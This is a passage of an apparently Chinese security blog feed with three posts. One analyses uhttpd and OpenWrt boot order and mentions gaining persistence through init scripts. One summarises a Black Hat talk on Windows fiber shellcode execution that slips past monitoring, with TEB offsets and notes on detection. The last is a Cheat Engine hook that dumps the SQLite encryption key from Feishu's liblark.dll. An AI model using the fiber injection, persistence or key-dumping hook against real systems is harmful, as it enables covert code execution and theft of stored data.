class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>主要是负责初始化工作。</p><p>下面是根据参数来判断是否fork使得uhttpd成为守护进程,从而可以在后台无干扰的运行，其中<code>cur_fd = open(&quot;/dev/null&quot;, O_WRONLY);</code>这一行使其无需与任何终端交互。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* fork (if not disabled) */</span><br><span class="hljs-keyword">if</span> (!nofork) &#123;<br><span class="hljs-keyword">switch</span> (fork()) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">-1</span>:<br>perror(<span class="hljs-string">&quot;fork()&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br><span class="hljs-comment">/* daemon setup */</span><br><span class="hljs-keyword">if</span> (chdir(<span class="hljs-string">&quot;/&quot;</span>))<br>perror(<span class="hljs-string">&quot;chdir()&quot;</span>);<br><br>cur_fd = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_WRONLY);<br><span class="hljs-keyword">if</span> (cur_fd &gt; <span class="hljs-number">0</span>) &#123;<br>dup2(cur_fd, <span class="hljs-number">0</span>);<br>dup2(cur_fd, <span class="hljs-number">1</span>);<br>dup2(cur_fd, <span class="hljs-number">2</span>);<br>&#125;<br><br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">default</span>:<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>至于守护进程解释如下</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs markdown">守护进程（Daemon Process）是运行在Unix和类Unix系统（如Linux）后台的特殊进程。与普通进程不同，它不与任何终端相关联。以下是守护进程的一些关键特点：<br><br><span class="hljs-bullet">1.</span> <span class="hljs-strong">**后台运行**</span>：守护进程在后台运行，不需要与前台交互。<br><br><span class="hljs-bullet">2.</span> <span class="hljs-strong">**没有终端**</span>：守护进程没有控制终端，因此它不会收到用户输入。<br><br><span class="hljs-bullet">3.</span> <span class="hljs-strong">**生命周期**</span>：通常，守护进程的生命周期从系统启动开始，一直到系统关闭。<br><br><span class="hljs-bullet">4.</span> <span class="hljs-strong">**常见的守护进程**</span>：很多系统级的服务，如web服务器、数据库服务器等，都是作为守护进程运行的。<br><br><span class="hljs-bullet">5.</span> <span class="hljs-strong">**创建守护进程**</span>：通常，守护进程是通过以下步骤创建的：<br><span class="hljs-bullet">   -</span> 调用<span class="hljs-code">`fork()`</span>并使父进程退出，这样子进程成为孤儿进程，并被init进程（进程ID为1）接管。<br><span class="hljs-bullet">   -</span> 更改文件模式掩码（umask），确保守护进程有适当的文件权限。<br><span class="hljs-bullet">   -</span> 更改工作目录到根目录，以确保守护进程不会阻止任何文件系统被卸载。<br><span class="hljs-bullet">   -</span> 关闭所有打开的文件描述符，这样守护进程不会持有不需要的资源。<br><span class="hljs-bullet">   -</span> 打开<span class="hljs-code">`/dev/null`</span>，并将标准输入、输出和错误重定向到它，这样守护进程不会在任何终端上显示输出或接收输入。<br><span class="hljs-bullet">   -</span> 调用<span class="hljs-code">`setsid()`</span>以创建新的会话，并使守护进程成为会话领导。<br><br><span class="hljs-bullet">6.</span> <span class="hljs-strong">**使用场景**</span>：守护进程通常用于提供各种网络服务（例如HTTP、SSH、FTP）或执行特定任务，如日志轮换、备份和系统监控。<br><br><span class="hljs-bullet">7.</span> <span class="hljs-strong">**结束与管理**</span>：守护进程可以由系统管理员使用命令（如<span class="hljs-code">`kill`</span>）终止，或通过系统工具（如<span class="hljs-code">`systemd`</span>、<span class="hljs-code">`init`</span>、<span class="hljs-code">`upstart`</span>等）进行管理和监控。<br></code></pre></td></tr></table></figure><p>最后就是</p><p><code>return run_server();</code></p><p>到此main函数结束。</p><p>服务启动函数定义在main函数如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">run_server</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>uloop_init();            <span class="hljs-comment">// 初始化事件循环库</span><br>uh_setup_listeners();    <span class="hljs-comment">// 设置HTTP服务器的监听器</span><br>uh_plugin_post_init();   <span class="hljs-comment">// 初始化插件后的处理</span><br>uloop_run();             <span class="hljs-comment">// 运行事件循环，等待客户端连接和处理</span><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>下面分析其功能</p><ol><li><p><strong>uloop_init</strong>:</p><p>这个函数用于初始化uloop库。在开始使用任何uloop功能之前，你首先需要调用此函数。它为后续的事件处理做好准备。</p></li><li><p><strong>uloop_run</strong>:</p><p>这个函数启动了事件循环。当你设置了一些事件监听器或计时器并准备好处理这些事件时，你可以调用这个函数。事件循环将持续运行，直到没有更多的事件要处理，或者直到调用<code>uloop_end</code>。</p></li></ol><p><strong>主要功能</strong>：</p><p><code>uloop</code>的主要目的是允许你的程序异步地响应各种事件，如：</p><ul><li><strong>文件描述符上的可读/可写事件</strong>：例如，当有新的TCP连接到达监听套接字时，或当一个文件变得可读时。</li><li><strong>计时器</strong>：允许你在某个时间点后执行某个操作。</li><li><strong>信号</strong>：允许你捕获和响应系统信号。</li></ul><p>简单来说，<code>uloop</code>允许你编写一个能够同时处理多个操作并响应外部事件的程序，而无需使用多线程或多进程。</p><p>使用<code>uloop</code>的一般流程是：</p><ol><li><p>使用<code>uloop_init</code>初始化。</p></li><li><p>设置你想要监听的事件。</p></li><li><p>调用<code>uloop_run</code>来启动事件循环。</p></li><li><p>在事件循环中，你的回调函数将被触发并处理相关的事件。</p></li><li><p>当完成所有操作或需要退出程序时，可以调用<code>uloop_end</code>来结束事件循环。</p></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">uh_setup_listeners</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">listener</span> *<span class="hljs-title">l</span>;</span><br><span class="hljs-keyword">int</span> yes = <span class="hljs-number">1</span>;<br><br>list_for_each_entry(l, &amp;listeners, <span class="hljs-built_in">list</span>) &#123;<br><span class="hljs-keyword">int</span> sock = l-&gt;fd.fd;<br><br><span class="hljs-comment">/* TCP keep-alive */</span><br><span class="hljs-keyword">if</span> (conf.tcp_keepalive &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> linux</span><br><span class="hljs-keyword">int</span> tcp_ka_idl, tcp_ka_int, tcp_ka_cnt, tcp_fstopn;<br><br>tcp_ka_idl = <span class="hljs-number">1</span>;<br>tcp_ka_cnt = <span class="hljs-number">3</span>;<br>tcp_ka_int = conf.tcp_keepalive;<br>tcp_fstopn = <span class="hljs-number">5</span>;<br><br>setsockopt(sock, SOL_TCP, TCP_KEEPIDLE,  &amp;tcp_ka_idl, <span class="hljs-keyword">sizeof</span>(tcp_ka_idl));<span class="hljs-comment">//TCP_KEEPIDLE: 这定义了当连接上最后一次数据传输之后，多久开始发送keep-alive探针。</span><br>setsockopt(sock, SOL_TCP, TCP_KEEPINTVL, &amp;tcp_ka_int, <span class="hljs-keyword">sizeof</span>(tcp_ka_int));<span class="hljs-comment">//TCP_KEEPINTVL: 在探针之间等待的时间。</span><br>setsockopt(sock, SOL_TCP, TCP_KEEPCNT,   &amp;tcp_ka_cnt, <span class="hljs-keyword">sizeof</span>(tcp_ka_cnt));<span class="hljs-comment">//TCP_KEEPCNT: 在认为连接已死之前，需要发送的未被确认的探针的数量。</span><br>setsockopt(sock, SOL_TCP, TCP_FASTOPEN,  &amp;tcp_fstopn, <span class="hljs-keyword">sizeof</span>(tcp_fstopn));<span class="hljs-comment">//TCP_FASTOPEN: 它允许数据在初始的SYN（TCP连接的开始）中被发送，这可以加速开放新的连接。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &amp;yes, <span class="hljs-keyword">sizeof</span>(yes));<br>&#125;<br><br>l-&gt;fd.cb = listener_cb;<br>uloop_fd_add(&amp;l-&gt;fd, ULOOP_READ);<span class="hljs-comment">//将监听器的文件描述符（socket）添加到事件循环中，并设置为读模式。</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> 函数的主要步骤如下：</p><ol><li><p>遍历每一个监听器,服务可能多端口监听。</p></li><li><p>如果配置中指定了TCP keep-alive的时间，那么设置相关的socket选项。这是用来检测并丢弃死掉的连接，确保资源不会被无效的客户端长时间占用。</p></li><li><p>在Linux系统上，可以设置更详细的TCP keep-alive参数，如keep-alive闲置时间、未确认的探针数等。</p></li><li><p>为每个监听器设置回调函数<code>listener_cb</code>，该函数会在有新的连接请求时被调用。</p></li><li><p>将监听器添加到事件循环中，并设置为监听读事件。这意味着每当有新的连接请求时，<code>listener_cb</code>函数将被调用。</p></li></ol><p>简单来说功能是为了初始化所有的监听器为其设置回调函数。</p><p>回调函数功能如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">listener_cb</span><span class="hljs-params">(struct uloop_fd *fd, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> events)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">listener</span> *<span class="hljs-title">l</span> =</span> container_of(fd, struct listener, fd);<br><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-keyword">if</span> (!uh_accept_client(fd-&gt;fd, l-&gt;tls))<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (conf.max_connections &amp;&amp; n_clients &gt;= conf.max_connections)<br>uh_block_listener(l);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">uh_block_listener</span><span class="hljs-params">(struct listener *l)</span></span><br><span class="hljs-function"></span>&#123;<br>uloop_fd_delete(&amp;l-&gt;fd);<br>n_blocked++;<br>l-&gt;blocked = <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>不断接受客户端链接，超出最大链接数量则阻塞。阻塞函数为uh_block_listener会为其设置对应的标志位，并增加对应的引用计数。</p><p>uh_accept_client函数定义在<code>client.c</code>中</p><p>这个函数会尝试接受一个新的客户端的链接</p><ul><li>先声明和初始化一些局部变量。</li><li>使用<code>accept</code>函数尝试从给定的文件描述符<code>fd</code>接受一个新的客户端连接。<ul><li>如果<code>accept</code>失败，则返回<code>false</code>。</li></ul></li><li><code>set_addr</code>函数用于保存客户端和服务器的地址信息。</li><li>根据是否是TLS连接，为新连接分配一个流并设置适当的回调。</li><li><code>ustream_fd_init</code>用于初始化新连接的ustream。</li><li><code>uh_poll_connection</code>函数调用来轮询连接。</li><li><code>list_add_tail</code>将新客户端添加到客户端列表中。</li><li>增加<code>n_clients</code>的计数器。</li></ul><p>uh_plugin_post_init函数主要是初始化所注册的插件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">uh_plugin_post_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uhttpd_plugin</span> *<span class="hljs-title">p</span>;</span><br><br>list_for_each_entry(p, &amp;plugins, <span class="hljs-built_in">list</span>) <span class="hljs-comment">// 遍历所有已注册的插件</span><br><span class="hljs-keyword">if</span> (p-&gt;post_init)                  <span class="hljs-comment">// 检查插件是否有post_init方法</span><br>p-&gt;post_init();                <span class="hljs-comment">// 调用该插件的post_init方法</span><br>&#125;<br></code></pre></td></tr></table></figure><p>以上是基本的启动流程代码，还有很多其他的部分如cgi处理，总的来说这类web服务器功能就是接受客户端的请求并做出响应，可以自行处理也可以交给后端的一些其他接口来处理如cgi lua php等</p><h2 id="openwrt启动流程"><a href="#openwrt启动流程" class="headerlink" title="openwrt启动流程"></a>openwrt启动流程</h2><p><code>vmlinux--&gt;/etc/preinit--&gt;/sbin/init--&gt;/etc/inittab--&gt;/etc/rc.d/*</code></p><p>内核在执行完kernel_init后会执行/etc/preinit脚本，该脚本主要功能负责初始化，特别是文件系统。preinit的工作之一就是将rom和overlay的文件系统合并。其次就是一些环境变量的设置，硬件方面的检测和设置等。</p><p>preinit执行完后会执行/sbin/init，该程序会负责初始化系统并管理所有其他的进程，通过解析/etc/inittab文件来实现，文件如下</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-meta">::sysinit:/etc/init.d/rcS</span> S boot<br><span class="hljs-meta">::shutdown:/etc/init.d/rcS</span> K shutdown<br>ttyS0::askfirst:/usr/libexec/login.sh<br>hvc0::askfirst:/usr/libexec/login.sh<br>tty1::askfirst:/usr/libexec/login.sh<br></code></pre></td></tr></table></figure><p>前俩行分别指系统初始化和关机时要启动的脚本他们分别会执行/etc/rc.d/下所有S或K开头的脚本，按照优先级依次执行。rc.d中存放的都是快捷方式链接到了init.d目录下。</p><p>想要持续化可以考虑修改rc.d和init.d目录下的文件，创建对应的文件也可以。前提是有overlay特性，注意不能修改preinit，因为preinit使用的还是rom中的，运行完后会把overlay和rom合并。</p><p>具体可见参考资料<a href="https://oldwiki.archive.openwrt.org/doc/techref/preinit_mount">openwrt启动流程</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>纤程学习</title>
    <link href="/2023/12/22/%E7%BA%A4%E7%A8%8B%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/12/22/%E7%BA%A4%E7%A8%8B%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>前阵子看到的一篇slides，感觉挺有意思，记录下学习过程。</p><a id="more"></a><h1 id="From-Dead-Data-to-Digestion"><a href="#From-Dead-Data-to-Digestion" class="headerlink" title="From Dead Data to Digestion"></a>From Dead Data to Digestion</h1><h2 id="Fibers"><a href="#Fibers" class="headerlink" title="Fibers"></a>Fibers</h2><p>轻量级纤程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">线程<br>每个进程强制，至少一个线程<br>内核切换<br><br>纤程<br>每个线程可选择，一个线程同时只能有一个纤程运行<br>用户态切换由应用程序决定<br></code></pre></td></tr></table></figure><p>每个纤程用户态存在一个fiber objects用来描述纤程</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs fortran">Components:<br>• Fiber Objects– including Fiber <span class="hljs-keyword">Data</span><br>• Fiber <span class="hljs-keyword">Local</span> Storage (FLS):<br>• <span class="hljs-built_in">Index</span><br>• Slots<br>• Fiber Callback functions<br></code></pre></td></tr></table></figure><p><img src="image-20230921135228998.png" alt="image-20230921135228998"></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1.</span> Thread converts itself <span class="hljs-built_in">to</span> <span class="hljs-keyword">a</span> fiber – ConvertThreadToFiber().<br><span class="hljs-number">2.</span> Create <span class="hljs-keyword">a</span> <span class="hljs-keyword">second</span> fiber– CreateFiber().<br><span class="hljs-number">3.</span> (Optional) Allocate FLS – FlsAlloc().<br><span class="hljs-number">4.</span> Switch <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> newly created fiber – SwitchToFiber().<br><span class="hljs-number">5.</span> When finished, <span class="hljs-built_in">convert</span> <span class="hljs-keyword">a</span> fiber back <span class="hljs-built_in">to</span> <span class="hljs-keyword">a</span> thread – ConvertFiberToThread().<br></code></pre></td></tr></table></figure><p>针对恶意代码的执行有俩种方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql">• Executing shellcode <span class="hljs-keyword">in</span> a <span class="hljs-keyword">local</span> process <span class="hljs-keyword">using</span> fibers:<br><span class="hljs-number">1.</span> <span class="hljs-keyword">Convert</span> a Thread <span class="hljs-keyword">to</span> a Fiber.<br><span class="hljs-number">2.</span> <span class="hljs-keyword">Allocate</span> memory <span class="hljs-operator">&amp;</span> <span class="hljs-keyword">copy</span> <span class="hljs-keyword">over</span> shellcode.<br><span class="hljs-number">3.</span> <span class="hljs-keyword">Create</span> a <span class="hljs-keyword">new</span> fiber, supply the shellcode address.<br><span class="hljs-number">4.</span> Schedule the newly created fiber.<br>• Fiber <span class="hljs-keyword">Local</span> Storage <span class="hljs-keyword">and</span> callback functions:<br><span class="hljs-number">1.</span> <span class="hljs-keyword">Convert</span> a Thread <span class="hljs-keyword">to</span> a Fiber.<br><span class="hljs-number">2.</span> <span class="hljs-keyword">Allocate</span> FLS index, suppling an evil callback<br>function.<br><span class="hljs-number">3.</span> (Optional) <span class="hljs-keyword">Set</span> a FLS slot <span class="hljs-keyword">value</span> <span class="hljs-keyword">to</span> use <span class="hljs-keyword">as</span> a callback<br>parameter.<br><span class="hljs-number">4.</span> <span class="hljs-keyword">Free</span> the FLS index <span class="hljs-operator">/</span> <span class="hljs-keyword">Delete</span> fiber<br></code></pre></td></tr></table></figure><p>一种是直接分配内存后让其执行，shellcode作为参数传递，另一种是通过设置FLS回调函数来实现。</p><h2 id="优势-amp-劣势"><a href="#优势-amp-劣势" class="headerlink" title="优势&amp;劣势"></a>优势&amp;劣势</h2><p>目前内核针对用户态的监控还没有纤程的只有线程，如PsSetCreateThreadNotifyRoutine。所以可以通过纤程来进行注入。</p><p>但是纤程不像线程有成熟的api可以调用比如createremotethread且有关的文档很少，基本没有讲过其internal的，也没有一些开源的工具。</p><h2 id="fiber原理与实现"><a href="#fiber原理与实现" class="headerlink" title="fiber原理与实现"></a>fiber原理与实现</h2><p>后续作者讲解了纤程的本质与实现。</p><p>用户态存在api IsThreadAFiber来判断当前线程是否为纤程</p><p>主要是通过判断teb的SameTebFlags标志位来实现。</p><p>这个api没有远程的实现，想要远程实现可以通过<code>CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) </code>首先获取所有的线程id然后<code>OpenThread() + NtQueryInformationThread()</code>获取teb的基址后续就是<code>ReadProcessMemory()</code>读取标志位来判断是否为纤程</p><p>接着是纤程的data位于<code>TEB.NT_TIB.FiberData</code></p><p>这部分是由函数<code>ConvertThreadToFiber</code>来实现</p><p><img src="image-20230921191949390.png" alt="image-20230921191949390"></p><p>知道了fiber object如何构造我们也可以自己来实现了。</p><p>关于检测这块，作者提到了遍历heap来实现，因为fiber的object固定大小为0x530</p><p><img src="image-20230921192427787.png" alt="image-20230921192427787"></p><p>获取到结构体后可以根据结构体的内容获取到双向链表，目标线程的所有纤程结构体</p><p>还能用于判断纤程是否为挂起</p><p>至此我们可以获取到与线程相关的所有纤程结构体</p><p>接着我们可以进一步获取fls里的所有内容通过分析<code>RtlFlsGetValue</code></p><p>然后就能进一步分析获取所有的FLS回调函数。</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>考虑到纯用户态实现+没有内核回调函数，是否可以通过人工实现远程纤程注入？</p><p>检测方法可以通过看有没有改写teb来实现</p><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>1.强行设置纤程</p><p>teb+0x17ee处存在flag标志位</p><p><code>teb-&gt;SameTebFlags |= 4u</code>即可</p><p>2.回调函数设置</p><p>结构体位于<code>ntdll.dll+184E50</code></p><p><code>struct _RTLP_FLS_CONTEXT RtlpFlsContext</code></p><p>其中偏移处+8是GLOBAL_FLS_DATA</p><p><img src="image-20230922112028288.png" alt="image-20230922112028288"></p><p>设置对应的number和回调函数即可</p><p>FlsSetValue函数主要是为其添加参数，参数位于</p><p>fiberdata=teb+0x20</p><p>flsdata=fiberdata+0x510</p><p>flsdata处存储了其对应的参数,这个必须要设置不然不会执行。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>blackhat USA 2023(From Dead Data to Digestion Extracting Windows Fibers for your digital forensics diet)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CE代码注入模板(自用)</title>
    <link href="/2023/07/22/CE%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%A8%A1%E6%9D%BF-%E8%87%AA%E7%94%A8/"/>
    <url>/2023/07/22/CE%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%A8%A1%E6%9D%BF-%E8%87%AA%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>自用注入模板，突然发现在某些场景下挺实用，比如hook sqlitekey函数 or sqliteexec函数时打印出所有的参数变量。</p><a id="more"></a><h1 id="CE-代码注入"><a href="#CE-代码注入" class="headerlink" title="CE 代码注入"></a>CE 代码注入</h1><p>针对飞书 sqlite3_key_v2（liblark.dll+761b9a0）函数hook</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs awk">&#123;<span class="hljs-variable">$lua</span>&#125;<br><span class="hljs-keyword">function</span> myfunction(param)<br>print(<span class="hljs-string">&quot;called&quot;</span>)<br>local keypointer = readInteger(param+<span class="hljs-number">16</span>)<br>local len = readInteger(param+<span class="hljs-number">20</span>)<br>local bytes = readBytes(keypointer,len,true)<br>local key=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i=<span class="hljs-number">1</span>,len <span class="hljs-keyword">do</span><br>    key = key..string.char(bytes[i])<br>end<br>print(<span class="hljs-string">&quot;key :&quot;</span> .. key)<br>print(string.format(<span class="hljs-string">&quot;len:%d&quot;</span>,len))<br>end<br><br><br>&#123;<span class="hljs-variable">$asm</span>&#125;<br>loadlibrary(luaclient-i386.dll)<br>luacall(openLuaServer(<span class="hljs-string">&#x27;CELUASERVER&#x27;</span>))<br>globalalloc(luainit, <span class="hljs-number">128</span>)<br>globalalloc(LuaFunctionCall, <span class="hljs-number">128</span>)<br>label(luainit_exit)<br>globalalloc(luaserverinitialized, <span class="hljs-number">4</span>)<br>globalalloc(luaservername, <span class="hljs-number">12</span>)<br>luaservername:<br>db <span class="hljs-string">&#x27;CELUASERVER&#x27;</span>,<span class="hljs-number">0</span><br>luainit:<br>cmp [luaserverinitialized],<span class="hljs-number">0</span><br>jne luainit_exit<br>push luaservername <span class="hljs-regexp">//</span>初次调用则会加载lua的dll<br>call CELUA_Initialize <span class="hljs-regexp">//</span>this <span class="hljs-keyword">function</span> is defined <span class="hljs-keyword">in</span> the luaclient dll<br>mov [luaserverinitialized],eax<br>luainit_exit:<br>ret<br>LuaFunctionCall:<br>push ebp<br>mov ebp,esp<br>call luainit<br>push [ebp+c]<br>push [ebp+<span class="hljs-number">8</span>]<br>call CELUA_ExecuteFunction<br>pop ebp<br>ret <span class="hljs-number">8</span><br><br>alloc(newmem,<span class="hljs-number">2048</span>)<br>label(returnhere)<br>label(originalcode)<br>label(<span class="hljs-keyword">exit</span>)<br><br>myluascript:<br>db <span class="hljs-string">&#x27;myfunction(parameter)&#x27;</span>,<span class="hljs-number">0</span><br>newmem: <span class="hljs-regexp">//</span>this is allocated memory, you have read,write,execute access<br><span class="hljs-regexp">//</span>place your code here<br>push ebp <span class="hljs-regexp">//</span>ebp保存<br>mov ebp,esp <span class="hljs-regexp">//</span>ebp初始化<br>push eax <span class="hljs-regexp">//</span>eax环境保存<br>push ebp <span class="hljs-regexp">//</span>此处将ebp作为参数传入<br>push myluascript <span class="hljs-regexp">//</span>函数名称<br>call LuaFunctionCall <span class="hljs-regexp">//</span>lua调用<br>pop eax <span class="hljs-regexp">//</span>eax恢复<br>mov esp,ebp <span class="hljs-regexp">//</span>esp还原<br>pop ebp <span class="hljs-regexp">//</span>ebp恢复<br><br>originalcode:<br>push esi<br>push [esp+<span class="hljs-number">0</span>C]<br><br><span class="hljs-keyword">exit</span>:<br>jmp returnhere<br><br><span class="hljs-string">&quot;liblark.dll&quot;</span>+<span class="hljs-number">761</span>B9A0:<br>jmp newmem<br>returnhere:<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>gdb固件提取插件</title>
